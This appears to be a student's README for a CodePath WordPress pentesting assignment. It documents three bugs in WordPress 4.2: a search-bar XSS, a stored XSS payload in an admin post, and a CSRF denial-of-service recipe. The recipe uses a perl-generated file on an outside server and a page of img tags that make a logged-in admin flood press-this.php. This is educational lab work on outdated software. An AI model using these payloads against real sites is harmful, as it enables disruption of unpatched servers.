# Codepath-week7-assignment
this is the codepath week 7 assignment
# Project 7 - WordPress Pentesting

Time spent: **infinity** hours spent in total

> Objective: Find, analyze, recreate, and document **three vulnerabilities** affecting an old version of WordPress

## Pentesting Report

1. (Required) Vulnerability Name or ID
  - [x] Summary: XSS in Media
    - Vulnerability types:XSS
    - Tested in version:4.2
    - Fixed in version: 4.7.5
  - [x] GIF Walkthrough: https://github.com/mcp352/Codepath-week7-assignment/blob/master/268E5800-5A93-4B21-894F-FCF51EDDC791.GIF
  - [x] Steps to recreate: I NO JOKE FOUND THIS ONE MYSELF
  when you cant find a page there is a wordpress search bar for which you can type in almsot any XSS code and get it to run

1. (Required) Vulnerability Name or ID
  - [x] Summary: Post XSS
    - Vulnerability types:XSS
    - Tested in version:4.2
    - Fixed in version: 4.2.16
  - [x] GIF Walkthrough: https://github.com/mcp352/Codepath-week7-assignment/blob/master/26853F0C-8FF8-45CD-A293-118BEDE1A3D8.GIF
  - [x] Steps to recreate: be an admin on a wordpress site and make a new (malicious) post that contains <img src=a onerror=(1)>

1. (Required) Vulnerability Name or ID
  - [x] Summary: CSRF and a dash of XSS
    - Vulnerability types:CSRF
    - Tested in version:4.2
    - Fixed in version: 4.2.15
  - [ ] GIF Walkthrough: I would post a GIF walkthrough but I do not have an external server to do this one
  - [x] Steps to recreate: On an external server, create a large text file with the command:
perl -e 'print "<>"x28000000' > foo.txt

Next, create a file called dos.html on the external server with enough entries to fill the connection pool of the WordPress server, as follows:
<img src='http://<wp server>/wp-admin/press-this.php?u=http%3A%2F%2F<external server>%2Ffoo.txt&url-scan-submit=Scan&a=b'>
<img src='http://<wp server>/wp-admin/press-this.php?u=http%3A%2F%2F<external server>%2Ffoo.txt&url-scan-submit=Scan&a=c'>
<img src='http://<wp server>/wp-admin/press-this.php?u=http%3A%2F%2F<external server>%2Ffoo.txt&url-scan-submit=Scan&a=d'>
<img src='http://<wp server>/wp-admin/press-this.php?u=http%3A%2F%2F<external server>%2Ffoo.txt&url-scan-submit=Scan&a=e'>
<img src='http://<wp server>/wp-admin/press-this.php?u=http%3A%2F%2F<external server>%2Ffoo.txt&url-scan-submit=Scan&a=f'>
<img src='http://<wp server>/wp-admin/press-this.php?u=http%3A%2F%2F<external server>%2Ffoo.txt&url-scan-submit=Scan&a=g'>
[..]
(replace <wp server> with the WordPress server address and <external server> with the external server)

Now have a logged in admin visit dos.html. The server will be down for a while.

## Bonus!
  https://github.com/mcp352/Codepath-week7-assignment/blob/master/EB38FDF2-8A6E-4C7A-AFB9-0EAB312CBC3B.GIF
  funny story is that whenever I load any page after XSS attack it ALWAYS loads the prompt even when the XSS is not in the search bar

## Resources


GIFs created with [SnagIt].

## License

    Copyright [2017] [Chase Pounders]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
